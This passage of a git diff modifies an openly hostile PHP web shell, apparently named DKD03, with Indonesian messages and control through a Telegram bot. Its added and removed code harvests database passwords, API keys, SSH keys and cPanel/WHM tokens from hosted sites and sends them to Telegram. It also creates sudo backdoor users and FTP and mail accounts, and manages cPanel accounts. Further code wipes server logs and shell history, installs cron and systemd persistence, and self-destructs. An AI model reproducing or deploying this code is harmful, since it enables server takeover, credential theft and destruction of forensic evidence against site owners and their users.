-                    $active_plugins = [];
-                    foreach ($plugins as $plugin) {
-                        if ($plugin != '.' && $plugin != '..' && is_dir($plugins_dir . '/' . $plugin)) {
-                            $active_plugins[] = $plugin;
-                        }
-                    }
-                    if (!empty($active_plugins)) {
-                        $creds[] = "   Plugins: " . implode(', ', array_slice($active_plugins, 0, 5));
-                        if (count($active_plugins) > 5) $creds[] = "   ... dan " . (count($active_plugins) - 5) . " lainnya";
-                    }
-                }
-            }
-            
-            $found[] = implode("\n", $creds);
-        }
-        
-        if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
-            $env_content = file_get_contents($root . '/.env');
-            $creds = [];
-            
-            preg_match_all('/([A-Z_]+)\s*=\s*(.+)/', $env_content, $matches);
-            
-            $creds[] = "📁 Laravel: $root";
-            if (!empty($matches[1])) {
-                foreach ($matches[1] as $i => $key) {
-                    $key = trim($key);
-                    $value = trim($matches[2][$i] ?? '');
-                    if (strpos($key, 'DB_') !== false || 
-                        strpos($key, 'PASS') !== false || 
-                        strpos($key, 'KEY') !== false ||
-                        strpos($key, 'SECRET') !== false ||
-                        strpos($key, 'TOKEN') !== false) {
-                        $creds[] = "   $key: $value";
-                    }
-                }
-            }
-            
-            if (preg_match('/APP_ENV\s*=\s*(.+)/', $env_content, $env_match)) {
-                $creds[] = "   APP_ENV: " . trim($env_match[1]);
-            }
-            
-            if (preg_match('/APP_DEBUG\s*=\s*(.+)/', $env_content, $debug_match)) {
-                $creds[] = "   APP_DEBUG: " . trim($debug_match[1]);
-            }
-            
-            $found[] = implode("\n", $creds);
-        }
-    }
-    
-    if (empty($found)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel.");
-        return [];
-    }
-    
-    $msg = "📊 *WordPress/Laravel Scan Results*\n\n" . implode("\n\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== FIND SENSITIVE FILES ====================
-function find_sensitive_files() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $patterns = [
-        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
-        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
-        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', '/configuration.php'
-    ];
-    $roots = get_all_document_roots_cached();
-    
-    foreach ($roots as $root) {
-        if (!is_dir($root)) continue;
-        foreach ($patterns as $pattern) {
-            $files = @glob($root . $pattern);
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (is_file($file) && is_readable($file)) {
-                        $size = formatSize(filesize($file));
-                        $found[] = $file . " (" . $size . ")";
-                    }
-                }
-            }
-        }
-    }
-    
-    if (empty($found)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif.");
-        return [];
-    }
-    
-    $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== CPANEL HARVEST ====================
-function cpanel_harvest() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $roots = get_all_document_roots_cached();
-    
-    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php'];
-    
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        
-        foreach ($config_files as $file) {
-            $path = $root . '/' . $file;
-            if (file_exists($path) && is_readable($path)) {
-                $content = file_get_contents($path);
-                
-                $patterns = [
-                    '/(DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|APP_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
-                    '/define\(\s*[\'"]?(DB_PASSWORD|DB_PASS)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
-                ];
-                
-                foreach ($patterns as $pattern) {
-                    preg_match_all($pattern, $content, $matches);
-                    if (!empty($matches[1]) && !empty($matches[2])) {
-                        foreach ($matches[1] as $i => $key) {
-                            $found[] = "📁 " . basename($path) . " - " . $key . ": " . trim($matches[2][$i]);
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    if (function_exists('shell_exec')) {
-        $home_dirs = @glob('/home/*');
-        if ($home_dirs !== false) {
-            foreach ($home_dirs as $home) {
-                $accesshash = $home . '/.accesshash';
-                if (file_exists($accesshash) && is_readable($accesshash)) {
-                    $hash = file_get_contents($accesshash);
-                    $found[] = "📁 " . basename($home) . " - AccessHash: " . trim($hash);
-                }
-            }
-        }
-    }
-    
-    if (empty($found)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial.");
-        return [];
-    }
-    
-    $msg = "🔑 *Credential Harvest Results*\n\n" . implode("\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== SSH KEYS GRABBER ====================
-function grab_ssh_keys() {
-    global $botToken, $telegramUserId;
-    $keys = [];
-    
-    if (function_exists('shell_exec')) {
-        $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
-        foreach ($users as $user) {
-            $user = trim($user);
-            if (empty($user)) continue;
-            
-            $auth = "/home/$user/.ssh/authorized_keys";
-            if (file_exists($auth) && is_readable($auth)) {
-                $content = file_get_contents($auth);
-                if (!empty(trim($content))) {
-                    $keys[] = "👤 User: $user\n" . $content;
-                }
-            }
-        }
-        
-        if (file_exists('/root/.ssh/authorized_keys') && is_readable('/root/.ssh/authorized_keys')) {
-            $content = file_get_contents('/root/.ssh/authorized_keys');
-            if (!empty(trim($content))) {
-                $keys[] = "👤 User: root\n" . $content;
-            }
-        }
-    }
-    
-    if (empty($keys)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys.");
-        return [];
-    }
-    
-    $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $keys;
+    return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors, 'total_domains' => count($domain_list)];
 }
 
 // ==================== CPANEL MODULE ====================
@@ -1270,30 +945,21 @@ function is_cpanel_installed() {
     if (file_exists('/usr/local/cpanel/version')) return true;
     if (file_exists('/usr/local/cpanel/cpanel')) return true;
     if (file_exists('/usr/local/cpanel')) return true;
-    
     $ports = [2082, 2083, 2086, 2087, 2095, 2096];
     foreach ($ports as $port) {
         $sock = @fsockopen('127.0.0.1', $port, $errno, $errstr, 1);
-        if ($sock) {
-            fclose($sock);
-            return true;
-        }
+        if ($sock) { fclose($sock); return true; }
     }
-    
     return false;
 }
 
 function get_whm_token() {
     $token_locations = [
-        '/root/.accesshash',
-        '/root/.cpanel/whm_token',
-        '/home/*/.cpanel/whm_token',
-        '/etc/cpanel/whm_token',
-        '/usr/local/cpanel/whm_token',
-        '/var/cpanel/whm_token',
+        '/root/.accesshash', '/root/.cpanel/whm_token',
+        '/home/*/.cpanel/whm_token', '/etc/cpanel/whm_token',
+        '/usr/local/cpanel/whm_token', '/var/cpanel/whm_token',
         '/root/.cpanel/token'
     ];
-    
     foreach ($token_locations as $pattern) {
         $files = @glob($pattern);
         if ($files !== false) {
@@ -1302,39 +968,24 @@ function get_whm_token() {
                     $content = @file_get_contents($file);
                     if ($content) {
                         $content = trim($content);
-                        if (preg_match('/[a-f0-9]{64}/i', $content, $match)) {
-                            return $match[0];
-                        }
-                        if (preg_match('/[a-f0-9]{32}/i', $content, $match)) {
-                            return $match[0];
-                        }
-                        if (strlen($content) > 20) {
-                            return $content;
-                        }
+                        if (preg_match('/[a-f0-9]{64}/i', $content, $match)) return $match[0];
+                        if (preg_match('/[a-f0-9]{32}/i', $content, $match)) return $match[0];
+                        if (strlen($content) > 20) return $content;
                     }
                 }
             }
         }
     }
-    
     $env_token = getenv('WHM_TOKEN');
     if ($env_token) return $env_token;
-    
     return false;
 }
 
 function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
     $token = get_whm_token();
-    if (!$token) {
-        return ['error' => 'WHM token tidak ditemukan'];
-    }
-    
-    if (!function_exists('curl_init')) {
-        return ['error' => 'CURL tidak tersedia'];
-    }
-    
+    if (!$token) return ['error' => 'WHM token tidak ditemukan'];
+    if (!function_exists('curl_init')) return ['error' => 'CURL tidak tersedia'];
     $url = "https://127.0.0.1:2087/json-api/" . $endpoint . "?" . http_build_query($params);
-    
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -1343,108 +994,62 @@ function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
     curl_setopt($ch, CURLOPT_TIMEOUT, 15);
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: whm ' . $token]);
     curl_setopt($ch, CURLOPT_USERAGENT, 'DKD03-API/1.0');
-    
     if ($method === 'POST') {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
     }
-    
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $curlError = curl_error($ch);
     curl_close($ch);
-    
-    if ($response === false) {
-        return ['error' => 'Gagal terhubung: ' . $curlError];
-    }
-    
-    if ($httpCode !== 200) {
-        return ['error' => 'HTTP Error: ' . $httpCode];
-    }
-    
+    if ($response === false) return ['error' => 'Gagal terhubung: ' . $curlError];
+    if ($httpCode !== 200) return ['error' => 'HTTP Error: ' . $httpCode];
     $data = json_decode($response, true);
-    if (!isset($data['data'])) {
-        return ['error' => 'Respon tidak valid'];
-    }
-    
+    if (!isset($data['data'])) return ['error' => 'Respon tidak valid'];
     return $data['data'];
 }
 
 function cpanel_list_accounts() {
     $data = cpanel_api_request('listaccts');
-    
-    if (isset($data['error'])) {
-        return "❌ " . $data['error'];
-    }
-    
-    if (!isset($data['acct']) || empty($data['acct'])) {
-        return "❌ Tidak ada akun ditemukan.";
-    }
-    
+    if (isset($data['error'])) return "❌ " . $data['error'];
+    if (!isset($data['acct']) || empty($data['acct'])) return "❌ Tidak ada akun ditemukan.";
     $accounts = [];
     foreach ($data['acct'] as $acct) {
         $accounts[] = "- " . $acct['user'] . " (domain: " . $acct['domain'] . ", plan: " . $acct['plan'] . ")";
     }
-    
     return "📋 *cPanel Accounts*\n\n" . implode("\n", $accounts);
 }
 
 function cpanel_create_account($username, $domain, $password, $plan = 'default') {
-    $params = [
-        'username' => $username,
-        'domain' => $domain,
-        'password' => $password,
-        'plan' => $plan,
-        'contactemail' => $username . '@' . $domain
-    ];
-    
+    $params = ['username' => $username, 'domain' => $domain, 'password' => $password, 'plan' => $plan, 'contactemail' => $username . '@' . $domain];
     $result = cpanel_api_request('createacct', $params, 'POST');
-    
-    if (isset($result['error'])) {
-        return "❌ " . $result['error'];
-    }
-    
+    if (isset($result['error'])) return "❌ " . $result['error'];
     return "✅ Akun berhasil dibuat:\nUsername: $username\nDomain: $domain\nPassword: $password";
 }
 
 function cpanel_change_password($username, $newPassword) {
     $params = ['user' => $username, 'pass' => $newPassword];
     $result = cpanel_api_request('passwd', $params, 'POST');
-    
-    if (isset($result['error'])) {
-        return "❌ " . $result['error'];
-    }
-    
+    if (isset($result['error'])) return "❌ " . $result['error'];
     return "✅ Password berhasil diubah untuk $username";
 }
 
 function cpanel_backup_account($username) {
     $params = ['user' => $username];
     $result = cpanel_api_request('backup', $params, 'POST');
-    
-    if (isset($result['error'])) {
-        return "❌ " . $result['error'];
-    }
-    
+    if (isset($result['error'])) return "❌ " . $result['error'];
     return "✅ Backup akun $username sedang diproses.";
 }
 
 function cpanel_delete_account($username, $keepfiles = '0') {
     $params = ['user' => $username, 'keepfiles' => $keepfiles];
     $result = cpanel_api_request('removeacct', $params, 'POST');
-    
-    if (isset($result['error'])) {
-        return "❌ " . $result['error'];
-    }
-    
+    if (isset($result['error'])) return "❌ " . $result['error'];
     return "✅ Akun $username berhasil dihapus.";
 }
 
 function cpanel_handler($action, $username = '', $extra = '') {
-    if (!is_cpanel_installed()) {
-        return "❌ cPanel/WHM tidak terdeteksi di server ini.";
-    }
-    
+    if (!is_cpanel_installed()) return "❌ cPanel/WHM tidak terdeteksi di server ini.";
     $token = get_whm_token();
     if (!$token) {
         return "❌ WHM token tidak ditemukan.\n\n"
@@ -1457,588 +1062,94 @@ function cpanel_handler($action, $username = '', $extra = '') {
              . "6. Copy token yang muncul\n"
              . "7. Simpan di /root/.cpanel/whm_token";
     }
-    
     switch ($action) {
-        case 'list':
-            return cpanel_list_accounts();
+        case 'list': return cpanel_list_accounts();
         case 'create':
-            if (empty($username) || empty($extra)) {
-                return "❌ Format: create [username] [domain] [password] [plan]\n"
-                     . "Contoh: create testuser test.com Pass123@ default";
-            }
+            if (empty($username) || empty($extra)) return "❌ Format: create [username] [domain] [password] [plan]\nContoh: create testuser test.com Pass123@ default";
             $parts = explode(' ', $extra);
             $domain = $parts[0] ?? '';
             $password = $parts[1] ?? 'password123';
             $plan = $parts[2] ?? 'default';
             return cpanel_create_account($username, $domain, $password, $plan);
         case 'passwd':
-            if (empty($username) || empty($extra)) {
-                return "❌ Format: passwd [username] [passwordbaru]";
-            }
+            if (empty($username) || empty($extra)) return "❌ Format: passwd [username] [passwordbaru]";
             return cpanel_change_password($username, $extra);
         case 'backup':
-            if (empty($username)) {
-                return "❌ Format: backup [username]";
-            }
+            if (empty($username)) return "❌ Format: backup [username]";
             return cpanel_backup_account($username);
         case 'delete':
-            if (empty($username)) {
-                return "❌ Format: delete [username] [keepfiles?]";
-            }
+            if (empty($username)) return "❌ Format: delete [username] [keepfiles?]";
             $keep = ($extra == 'keep') ? '1' : '0';
             return cpanel_delete_account($username, $keep);
-        default:
-            return "❌ Aksi tidak dikenali.\n"
-                 . "Gunakan: list, create, passwd, backup, delete";
+        default: return "❌ Aksi tidak dikenali.\nGunakan: list, create, passwd, backup, delete";
     }
+}
+
+// ==================== CPANEL HARVEST ====================
+function cpanel_harvest() {
+    global $botToken, $telegramUserId;
+    $found = [];
+    $roots = get_all_document_roots_cached();
+    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php'];
+    foreach ($roots as $root) {
+        if (!is_dir($root) || !is_readable($root)) continue;
+        foreach ($config_files as $file) {
+            $path = $root . '/' . $file;
+            if (file_exists($path) && is_readable($path)) {
+                $content = file_get_contents($path);
+                $patterns = [
+                    '/(DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|APP_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
+                    '/define\(\s*[\'"]?(DB_PASSWORD|DB_PASS)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
+                ];
+                foreach ($patterns as $pattern) {
+                    preg_match_all($pattern, $content, $matches);
+                    if (!empty($matches[1]) && !empty($matches[2])) {
+                        foreach ($matches[1] as $i => $key) {
+                            $found[] = "📁 " . basename($path) . " - " . $key . ": " . trim($matches[2][$i]);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    if (function_exists('shell_exec')) {
+        $home_dirs = @glob('/home/*');
+        if ($home_dirs !== false) {
+            foreach ($home_dirs as $home) {
+                $accesshash = $home . '/.accesshash';
+                if (file_exists($accesshash) && is_readable($accesshash)) {
+                    $hash = file_get_contents($accesshash);
+                    $found[] = "📁 " . basename($home) . " - AccessHash: " . trim($hash);
+                }
+            }
+        }
+    }
+    if (empty($found)) { sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial."); return []; }
+    $msg = "🔑 *Credential Harvest Results*\n\n" . implode("\n", $found);
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $found;
 }
 
 // ==================== BACKDOOR USER ====================
 function create_backdoor_user($username, $password) {
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    
     $output = @shell_exec("useradd -m -s /bin/bash " . escapeshellarg($username) . " 2>&1");
-    if (strpos($output, 'exists') !== false) {
-        return "⚠️ User $username sudah ada.";
-    }
-    
+    if (strpos($output, 'exists') !== false) return "⚠️ User $username sudah ada.";
     @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>&1");
     @shell_exec("usermod -aG sudo " . escapeshellarg($username) . " 2>&1");
     @shell_exec("usermod -aG wheel " . escapeshellarg($username) . " 2>&1");
-    
     $uid = @shell_exec("id -u " . escapeshellarg($username) . " 2>&1");
-    
     return "✅ User $username created\nPassword: $password\nUID: $uid";
-}
-
-// ==================== LIST SPREAD FILES ====================
-function list_spread_files() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $myFile = basename(__FILE__);
-    $roots = get_all_document_roots_cached();
-    
-    foreach ($roots as $root) {
-        $path = $root . '/' . $myFile;
-        if (file_exists($path)) {
-            $found[] = $path;
-        }
-    }
-    
-    if (empty($found)) {
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan.");
-        return [];
-    }
-    
-    $msg = "📋 *Spread Files*\n\n" . implode("\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== RANSOMWARE CREATOR ====================
-function create_ransomware() {
-    global $botToken, $telegramUserId;
-    
-    $code = '<?php
-echo "💀 RANSOMWARE DKD03\n";
-echo "File terenkripsi: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
-echo "Password: Dkd03Ransom2025\n";
-?>';
-    
-    $file = __DIR__ . '/R.php';
-    @file_put_contents($file, $code);
-    @chmod($file, 0644);
-    
-    $url = "http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/R.php";
-    
-    sendTelegramMessage($botToken, $telegramUserId, "💀 Ransomware created:\n📁 $file\n🔗 $url");
-    return true;
-}
-
-// ==================== SELF-DESTRUCTION ULTIMATE ====================
-function self_destruct_ultimate() {
-    global $botToken, $telegramUserId;
-    $current_file = __FILE__;
-    $current_dir = __DIR__;
-    
-    // Kirim notifikasi terakhir
-    sendTelegramMessage($botToken, $telegramUserId, "💀 Self-destruct initiated!");
-    
-    // ===== 1. MATIKAN ANTI-DELETE =====
-    if (function_exists('shell_exec')) {
-        // Matikan chattr +i pada file utama
-        @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
-        @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
-        @shell_exec("chattr -R -i " . escapeshellarg($current_dir) . " 2>/dev/null");
-        
-        // Matikan semua proses yang terkait
-        @shell_exec("pkill -f '" . basename($current_file) . "' 2>/dev/null");
-        @shell_exec("pkill -f 'system_cache_repair' 2>/dev/null");
-        @shell_exec("pkill -f 'anti_delete_ultimate' 2>/dev/null");
-    }
-    
-    // ===== 2. HAPUS ALL BACKUP =====
-    $backup_patterns = [
-        dirname(__DIR__) . '/.cache/*.inc',
-        '/tmp/*' . md5($current_file) . '*.inc',
-        '/var/tmp/*' . md5($current_file) . '*.inc',
-        '/dev/shm/*' . md5($current_file) . '*.inc',
-        $current_dir . '/.cache/*.inc',
-        $current_dir . '/*.inc'
-    ];
-    
-    foreach ($backup_patterns as $pattern) {
-        $files = @glob($pattern);
-        if ($files !== false) {
-            foreach ($files as $file) {
-                if (function_exists('shell_exec')) {
-                    @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
-                    @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
-                }
-                @unlink($file);
-            }
-        }
-    }
-    
-    // ===== 3. HAPUS CRON =====
-    if (function_exists('shell_exec')) {
-        // Hapus semua cron yang terkait
-        @shell_exec('crontab -l 2>/dev/null | grep -v "' . basename($current_file) . '" | crontab - 2>/dev/null');
-        @shell_exec('crontab -l 2>/dev/null | grep -v "cache_repair" | crontab - 2>/dev/null');
-        @shell_exec('crontab -l 2>/dev/null | grep -v "system_cache" | crontab - 2>/dev/null');
-        
-        // Hapus file cron di /etc/cron.d/
-        @shell_exec('rm -f /etc/cron.d/*' . basename($current_file) . ' 2>/dev/null');
-        @shell_exec('rm -f /etc/cron.d/*dkd* 2>/dev/null');
-    }
-    
-    // ===== 4. HAPUS SYSTEMD SERVICE =====
-    if (isRoot() && function_exists('shell_exec')) {
-        @shell_exec('systemctl stop dkd.service 2>/dev/null');
-        @shell_exec('systemctl disable dkd.service 2>/dev/null');
-        @shell_exec('rm -f /etc/systemd/system/dkd.service 2>/dev/null');
-        @shell_exec('systemctl daemon-reload 2>/dev/null');
-    }
-    
-    // ===== 5. HAPUS RC.LOCAL =====
-    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local') && function_exists('shell_exec')) {
-        $rc_content = file_get_contents('/etc/rc.local');
-        $rc_content = preg_replace('/.*' . preg_quote(basename($current_file), '/') . '.*\n/', '', $rc_content);
-        $rc_content = preg_replace('/.*dkd.*\n/', '', $rc_content);
-        file_put_contents('/etc/rc.local', $rc_content);
-    }
-    
-    // ===== 6. HAPUS FILE UTAMA (MULTI METHOD) =====
-    $file_deleted = false;
-    
-    // Method 1: chattr + unlink
-    if (function_exists('shell_exec')) {
-        @shell_exec("chattr -i " . escapeshellarg($current_file) . " 2>/dev/null");
-        @shell_exec("chattr -a " . escapeshellarg($current_file) . " 2>/dev/null");
-    }
-    @chmod($current_file, 0777);
-    if (@unlink($current_file)) {
-        $file_deleted = true;
-    }
-    
-    // Method 2: shell_exec rm
-    if (!$file_deleted && function_exists('shell_exec')) {
-        @shell_exec("rm -f " . escapeshellarg($current_file) . " 2>/dev/null");
-        @shell_exec("shred -fuz " . escapeshellarg($current_file) . " 2>/dev/null");
-        if (!file_exists($current_file)) $file_deleted = true;
-    }
-    
-    // Method 3: PHP delete (fallback)
-    if (!$file_deleted) {
-        $fp = @fopen($current_file, 'w');
-        if ($fp) {
-            @fclose($fp);
-            @unlink($current_file);
-        }
-    }
-    
-    // Method 4: rename dan delete
-    if (!$file_deleted && file_exists($current_file)) {
-        $temp_name = $current_dir . '/.deleted_' . time() . '.tmp';
-        @rename($current_file, $temp_name);
-        @unlink($temp_name);
-    }
-    
-    // ===== 7. SELF-DELETE SCRIPT (FINAL FALLBACK) =====
-    if (!$file_deleted && function_exists('shell_exec')) {
-        $script = '/tmp/self_del_' . rand(1000, 99999) . '.sh';
-        $content = '#!/bin/bash
-sleep 2
-chattr -i ' . escapeshellarg($current_file) . ' 2>/dev/null
-rm -f ' . escapeshellarg($current_file) . ' 2>/dev/null
-shred -fuz ' . escapeshellarg($current_file) . ' 2>/dev/null
-rm -f ' . escapeshellarg($script) . ' 2>/dev/null
-';
-        @file_put_contents($script, $content);
-        @chmod($script, 0755);
-        @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
-    }
-    
-    // ===== 8. HAPUS DIRECTORY CACHE =====
-    $cache_dirs = [
-        $current_dir . '/.cache',
-        dirname(__DIR__) . '/.cache'
-    ];
-    foreach ($cache_dirs as $dir) {
-        if (is_dir($dir)) {
-            if (function_exists('shell_exec')) {
-                @shell_exec("rm -rf " . escapeshellarg($dir) . " 2>/dev/null");
-            }
-            deleteDirectory($dir);
-        }
-    }
-    
-    // ===== 9. HAPUS SESSION =====
-    session_destroy();
-    if (ini_get("session.use_cookies")) {
-        $params = session_get_cookie_params();
-        setcookie(session_name(), '', time() - 42000,
-            $params["path"], $params["domain"],
-            $params["secure"], $params["httponly"]
-        );
-    }
-    
-    // ===== 10. EXIT =====
-    echo "💀 Self-destruct completed!";
-    exit;
-}
-
-// ==================== ANTI FORENSIC ====================
-function anti_forensic_ultimate() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    
-    $logs = [
-        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
-        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
-        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
-        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure'
-    ];
-    
-    foreach ($logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            $size = @filesize($log);
-            if ($size !== false && $size > 0) {
-                @file_put_contents($log, str_repeat("\x00", $size));
-            }
-            @unlink($log);
-            $results[] = "Cleaned: $log";
-        }
-    }
-    
-    if (function_exists('shell_exec')) {
-        @shell_exec('history -c 2>/dev/null');
-        @shell_exec('unset HISTFILE 2>/dev/null');
-        $results[] = "Command history cleared";
-    }
-    
-    $msg = "🧹 *Anti Forensic*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-// ==================== BYPASS SUHOSIN ====================
-function bypass_suhosin() {
-    global $botToken, $telegramUserId;
-    
-    $disabled = ini_get('disable_functions');
-    $open_basedir = ini_get('open_basedir');
-    $suhosin_eval = ini_get('suhosin.executor.disable_eval');
-    
-    $msg = "🛡️ *Suhosin Status*\n\n"
-         . "Disabled Functions: " . ($disabled ?: 'none') . "\n"
-         . "open_basedir: " . ($open_basedir ?: 'none') . "\n"
-         . "suhosin.executor.disable_eval: " . ($suhosin_eval ? 'ON' : 'OFF') . "\n\n";
-    
-    $methods = [];
-    if (function_exists('dl') && !in_array('dl', explode(',', $disabled))) {
-        $methods[] = 'dl()';
-    }
-    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', $disabled))) {
-        $methods[] = 'pcntl_exec()';
-    }
-    if (function_exists('proc_open') && !in_array('proc_open', explode(',', $disabled))) {
-        $methods[] = 'proc_open()';
-    }
-    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', $disabled))) {
-        $methods[] = 'shell_exec()';
-    }
-    
-    if (!empty($methods)) {
-        $msg .= "✅ Available bypass methods:\n" . implode("\n", $methods);
-    } else {
-        $msg .= "❌ No bypass methods available.";
-    }
-    
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => $msg];
-}
-
-// ==================== FTP ACCOUNT CREATOR ====================
-function create_ftp_account($username, $password, $home = '') {
-    global $botToken, $telegramUserId;
-    
-    $home = $home ?: '/home/' . $username;
-    $results = [];
-    
-    if (function_exists('shell_exec')) {
-        if (file_exists('/usr/bin/pure-pw')) {
-            @shell_exec("echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home) . " 2>/dev/null");
-            @shell_exec('pure-pw mkdb 2>/dev/null');
-            $results[] = "PureFTPd account created";
-        }
-        
-        if (file_exists('/etc/vsftpd.conf')) {
-            $userlist = '/etc/vsftpd.userlist';
-            if (file_exists($userlist) && is_writable($userlist)) {
-                @file_put_contents($userlist, $username . "\n", FILE_APPEND);
-                @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>/dev/null");
-                $results[] = "vsftpd account created";
-            }
-        }
-    }
-    
-    if (empty($results)) {
-        $results[] = "Tidak ada FTP server terdeteksi";
-    }
-    
-    $msg = "📂 *FTP Account*\nUsername: $username\nPassword: $password\nHome: $home\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return ['success' => true, 'msg' => "✅ FTP account $username created"];
-}
-
-// ==================== MAIL ACCOUNT CREATOR ====================
-function create_mail_account($email, $password, $domain = '') {
-    global $botToken, $telegramUserId;
-    
-    $domain = $domain ?: $_SERVER['HTTP_HOST'];
-    $username = explode('@', $email)[0];
-    $results = [];
-    
-    if (function_exists('shell_exec')) {
-        if (file_exists('/usr/bin/doveadm') && file_exists('/etc/postfix/virtual')) {
-            @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
-            @file_put_contents('/etc/postfix/virtual', "$email $username@$domain\n", FILE_APPEND);
-            @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
-            @shell_exec('postfix reload 2>/dev/null');
-            $results[] = "Postfix virtual account created";
-        }
-        
-        if (file_exists('/usr/sbin/exim')) {
-            $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
-            if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
-            $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
-            if ($hash) {
-                @file_put_contents($exim_user, $username . ':' . trim($hash) . '::' . $domain . "\n", FILE_APPEND);
-                $results[] = "Exim account created";
-            }
-        }
-    }
-    
-    if (empty($results)) {
-        $results[] = "Tidak ada mail server terdeteksi";
-    }
-    
-    $msg = "📧 *Mail Account*\nEmail: $email\nPassword: $password\nDomain: $domain\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    return ['success' => true, 'msg' => "✅ Mail account $email created"];
-}
-
-// ==================== DEEP PERSISTENCE ====================
-function install_deep_persistence() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    
-    if (!isRoot()) {
-        return ['success' => false, 'msg' => "❌ Harus root"];
-    }
-    
-    if (function_exists('shell_exec')) {
-        $service = '[Unit]
-Description=DKD Cache
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=php ' . __FILE__ . ' --daemon
-Restart=always
-RestartSec=60
-
-[Install]
-WantedBy=multi-user.target';
-        
-        @file_put_contents('/etc/systemd/system/dkd.service', $service);
-        @shell_exec('systemctl daemon-reload 2>/dev/null');
-        @shell_exec('systemctl enable dkd.service 2>/dev/null');
-        @shell_exec('systemctl start dkd.service 2>/dev/null');
-        $results[] = "✅ Systemd service installed";
-        
-        $cron = "*/5 * * * * php " . __FILE__ . " > /dev/null 2>&1";
-        @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
-        $results[] = "✅ Cron job installed";
-        
-        if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
-            $rc = file_get_contents('/etc/rc.local');
-            $rc = str_replace('exit 0', '', $rc);
